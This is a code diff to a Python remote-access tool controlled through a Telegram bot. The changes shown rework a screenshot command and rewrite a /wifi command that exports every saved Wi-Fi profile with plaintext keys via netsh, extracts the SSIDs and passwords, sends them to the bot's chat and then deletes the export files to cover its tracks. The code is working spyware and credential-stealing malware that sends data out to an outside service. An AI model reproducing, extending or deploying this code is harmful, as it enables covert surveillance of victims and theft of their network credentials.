@@ -3,6 +3,7 @@ import re
 import mss
 import cv2
 import time
+import shutil
 import pyttsx3
 import telebot
 import platform
@@ -12,7 +13,7 @@ import pyAesCrypt
 import xml.etree.ElementTree as ET
 from secure_delete import secure_delete
 
-TOKEN = 'YOUR-TOKEN'  
+TOKEN = ''  
 
 bot = telebot.TeleBot(TOKEN)
 cd = os.path.expanduser("~")
@@ -26,10 +27,13 @@ def start(message):
 
 @bot.message_handler(commands=['screen'])
 def send_screen(message):
+    file_name = "capture.png"
+    image_path = os.path.join(cd, file_name)
+
     with mss.mss() as sct:
-        sct.shot(output=f"{cd}\capture.png")
+        sct.shot(output=image_path)
                               
-    image_path = f"{cd}\capture.png"
+    # image_path = f"{cd}\capture.png"
     print(image_path)
     with open(image_path, "rb") as photo:
         bot.send_photo(message.chat.id, photo)
@@ -339,33 +343,51 @@ def send_long_message(user_id, message_text):
 @bot.message_handler(commands=['wifi'])
 def get_wifi_passwords(message):
     try:
+        export_folder = os.path.join(cd, "wifi_profiles")
+        os.makedirs(export_folder, exist_ok=True)  # Create folder if not exists
         
-        subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], shell=True, text=True)
+        subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear', f'folder={export_folder}'], shell=True, text=True)
 
+        # list all xml files in the folder
+        files = [f for f in os.listdir(export_folder) if f.endswith('.xml')]
+
+        if not files:
+            bot.send_message(message.chat.id, "No Wi-Fi profiles found.")
+            return
         
-        with open('Wi-Fi-App.xml', 'r') as file:
-            xml_content = file.read()
+        all_profiles = ""
+        # loop through all profile XML files
+        for profile_file in files:
+            profile_path = os.path.join(export_folder, profile_file)
 
-      
-        ssid_match = re.search(r'<name>(.*?)<\/name>', xml_content)
-        password_match = re.search(r'<keyMaterial>(.*?)<\/keyMaterial>', xml_content)
-
-        if ssid_match and password_match:
-            ssid = ssid_match.group(1)
-            password = password_match.group(1)
-
-            message_text = f"SSID: {ssid}\nPASS: {password}"
-            bot.send_message(message.chat.id, message_text)
             try:
-                os.remove("Wi-Fi-App.xml")
-            except:
-                pass
+                with open(profile_path, 'r', encoding='utf-8') as file:
+                    xml_content = file.read()
+
+                # parse the XML content
+                ssid_match = re.search(r'<name>(.*?)<\/name>', xml_content)
+                password_match = re.search(r'<keyMaterial>(.*?)<\/keyMaterial>', xml_content)
+
+                if ssid_match:
+                    ssid = ssid_match.group(1)
+                    password = password_match.group(1) if password_match else "(No Password Found)"
+                    all_profiles += f"SSID: {ssid}\nPASS: {password}\n\n"
+
+               
+            except Exception as e:
+                bot.send_message(message.chat.id, f"error processing file : {profile_file} : {e}")
+
+        if all_profiles:
+            bot.send_message(message.chat.id, f"Wi-Fi profiles:\n{all_profiles}")
         else:
-            bot.send_message(message.chat.id, "NOT FOUND.")
+            bot.send_message(message.chat.id, "No Wi-Fi profiles found.")
 
     except Exception as e:
         bot.send_message(message.chat.id, f"An error occurred : {str(e)}")
-
+    
+    finally:
+        if os.path.exists(export_folder):
+            shutil.rmtree(export_folder)
 
 try:
     if __name__ == "__main__":
